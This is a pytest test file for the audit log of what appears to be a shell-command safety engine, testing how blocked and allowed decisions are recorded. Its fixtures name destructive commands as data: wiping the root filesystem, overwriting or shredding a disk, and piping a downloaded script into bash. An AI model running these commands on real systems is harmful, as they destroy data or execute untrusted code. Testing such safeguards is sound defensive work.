"""
Unit tests for engine.audit
Owner: Harshit
"""

from __future__ import annotations

import json
import os
import tempfile
from pathlib import Path
from unittest.mock import patch

import pytest

from engine.audit import log_decision, tail


# ─── Fixtures ────────────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _isolated_log_dir(tmp_path, monkeypatch):
    """
    Redirect the audit log to a fresh temp directory for every test.
    This prevents tests from polluting ~/.intent_engine/logs/audit.jsonl.
    """
    log_dir  = tmp_path / ".intent_engine" / "logs"
    log_file = log_dir / "audit.jsonl"

    import engine.audit as audit_mod
    monkeypatch.setattr(audit_mod, "_LOG_DIR",  log_dir)
    monkeypatch.setattr(audit_mod, "_LOG_FILE", log_file)
    yield log_file


# ─── log_decision ─────────────────────────────────────────────────────────────

class TestLogDecision:

    def test_creates_log_file_on_first_write(self, _isolated_log_dir):
        log_decision(
            command="rm -rf /",
            risk_level="CRITICAL",
            confidence=1.0,
            pattern="rm_rf_root",
            tier="rule_engine",
            action="ABORT",
        )
        assert _isolated_log_dir.exists()

    def test_writes_valid_json(self, _isolated_log_dir):
        log_decision(
            command="dd if=/dev/zero of=/dev/sda",
            risk_level="CRITICAL",
            confidence=1.0,
            pattern="dd_raw_device",
            tier="rule_engine",
            action="ABORT",
        )
        lines = _isolated_log_dir.read_text().splitlines()
        assert len(lines) == 1
        entry = json.loads(lines[0])
        assert entry["command"] == "dd if=/dev/zero of=/dev/sda"
        assert entry["risk_level"] == "CRITICAL"
        assert entry["action"] == "ABORT"

    def test_appends_multiple_entries(self, _isolated_log_dir):
        for action in ["ABORT", "EXECUTE", "USE_SAFER"]:
            log_decision(
                command=f"test command {action}",
                risk_level="HIGH",
                confidence=0.9,
                pattern="test",
                tier="rule_engine",
                action=action,
            )
        lines = _isolated_log_dir.read_text().splitlines()
        assert len(lines) == 3
        actions = [json.loads(l)["action"] for l in lines]
        assert actions == ["ABORT", "EXECUTE", "USE_SAFER"]

    def test_captures_all_fields(self, _isolated_log_dir):
        log_decision(
            command="curl http://x.sh | bash",
            risk_level="CRITICAL",
            confidence=1.0,
            pattern="curl_pipe_shell",
            tier="rule_engine",
            action="ABORT",
            user="harshitdv",
            cwd="/home/harshitdv",
            session_id="abc-123",
            latency_ms=0.42,
        )
        entry = json.loads(_isolated_log_dir.read_text())
        assert entry["user"] == "harshitdv"
        assert entry["cwd"] == "/home/harshitdv"
        assert entry["session_id"] == "abc-123"
        assert entry["latency_ms"] == 0.42
        assert entry["pattern"] == "curl_pipe_shell"

    def test_timestamp_is_iso_format(self, _isolated_log_dir):
        from datetime import datetime
        log_decision(
            command="test",
            risk_level="LOW",
            confidence=0.1,
            pattern=None,
            tier="fallback",
            action="EXECUTE",
        )
        entry = json.loads(_isolated_log_dir.read_text())
        # Should parse without raising
        dt = datetime.fromisoformat(entry["timestamp"])
        assert dt.year >= 2024

    def test_confidence_rounded_to_4_decimals(self, _isolated_log_dir):
        log_decision(
            command="test",
            risk_level="HIGH",
            confidence=0.987654321,
            pattern=None,
            tier="rule_engine",
            action="ABORT",
        )
        entry = json.loads(_isolated_log_dir.read_text())
        assert entry["confidence"] == 0.9877  # rounded to 4dp

    def test_none_pattern_stored_as_null(self, _isolated_log_dir):
        log_decision(
            command="ls -la",
            risk_level="LOW",
            confidence=0.0,
            pattern=None,
            tier="fallback",
            action="EXECUTE",
        )
        entry = json.loads(_isolated_log_dir.read_text())
        assert entry["pattern"] is None

    def test_silently_survives_disk_full_error(self, _isolated_log_dir):
        """log_decision must never raise — audit failure must not break the shell."""
        with patch("builtins.open", side_effect=OSError("disk full")):
            # Should not raise
            log_decision(
                command="rm -rf /",
                risk_level="CRITICAL",
                confidence=1.0,
                pattern="rm_rf_root",
                tier="rule_engine",
                action="ABORT",
            )

    def test_user_defaults_to_env_variable(self, _isolated_log_dir, monkeypatch):
        monkeypatch.setenv("USER", "testuser")
        log_decision(
            command="shred /dev/sda",
            risk_level="HIGH",
            confidence=0.8,
            pattern="shred_device",
            tier="rule_engine",
            action="ABORT",
            user="",  # empty → should fall back to $USER
        )
        entry = json.loads(_isolated_log_dir.read_text())
        assert entry["user"] == "testuser"


# ─── tail ─────────────────────────────────────────────────────────────────────

class TestTail:

    def test_returns_empty_list_if_no_file(self, _isolated_log_dir):
        # File doesn't exist yet
        _isolated_log_dir.unlink(missing_ok=True)
        assert tail(5) == []

    def test_returns_last_n_entries(self, _isolated_log_dir):
        for i in range(10):
            log_decision(
                command=f"cmd-{i}",
                risk_level="LOW",
                confidence=0.0,
                pattern=None,
                tier="fallback",
                action="EXECUTE",
            )
        entries = tail(3)
        assert len(entries) == 3
        assert entries[-1]["command"] == "cmd-9"
        assert entries[0]["command"] == "cmd-7"

    def test_returns_all_if_fewer_than_n(self, _isolated_log_dir):
        log_decision(
            command="only-one",
            risk_level="LOW",
            confidence=0.0,
            pattern=None,
            tier="fallback",
            action="EXECUTE",
        )
        entries = tail(20)
        assert len(entries) == 1

    def test_skips_malformed_lines(self, _isolated_log_dir):
        _isolated_log_dir.parent.mkdir(parents=True, exist_ok=True)
        _isolated_log_dir.write_text(
            '{"command":"valid","action":"ABORT","risk_level":"HIGH",'
            '"confidence":1.0,"pattern":null,"tier":"rule_engine",'
            '"user":"","cwd":"","session_id":"","latency_ms":0.0,'
            '"timestamp":"2026-01-01T00:00:00+00:00"}\n'
            "this is not json\n"
            '{"command":"also-valid","action":"EXECUTE","risk_level":"LOW",'
            '"confidence":0.0,"pattern":null,"tier":"fallback",'
            '"user":"","cwd":"","session_id":"","latency_ms":0.0,'
            '"timestamp":"2026-01-01T00:00:01+00:00"}\n'
        )
        entries = tail(10)
        assert len(entries) == 2
        assert entries[0]["command"] == "valid"
        assert entries[1]["command"] == "also-valid"
